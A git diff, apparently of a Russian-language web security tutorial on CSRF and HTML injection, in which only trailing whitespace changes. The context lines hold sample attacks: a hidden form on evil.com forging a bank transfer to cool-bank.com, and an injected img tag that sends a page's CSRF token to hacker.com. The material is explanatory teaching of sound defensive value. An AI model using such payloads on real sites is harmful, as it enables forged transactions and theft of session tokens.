@@ -20,9 +20,9 @@ Cross-Site Request Forgery, CSRF — межсайтовая подделка з�
 4. Сайт `evil.com` отправляет скрытую форму на `cool-bank.com`.
 
    ```html
-   <form action="https://cool-bank.com/sendmoney" method="POST">  
-     <input type="hidden" name="sendmoney" value="1000">  
-   </form>  
+   <form action="https://cool-bank.com/sendmoney" method="POST">
+     <input type="hidden" name="sendmoney" value="1000">
+   </form>
    ```
 
    В примере используется форма, чтобы отправить запрос на перевод денег от имени пользователя.
@@ -105,7 +105,7 @@ HTML-инъекции могут нарушить форматирование �
 <form method="POST" action="action.php">
     <input type="text" name="foo" value="" />
     <img src='http://hacker.com?token="'>
-    <!-- Это наш секретный CSRF-токен! -->	
+    <!-- Это наш секретный CSRF-токен! -->
     <input type="hidden" name="sessid" id="sessid" value="random" />
 </form>
 <script>
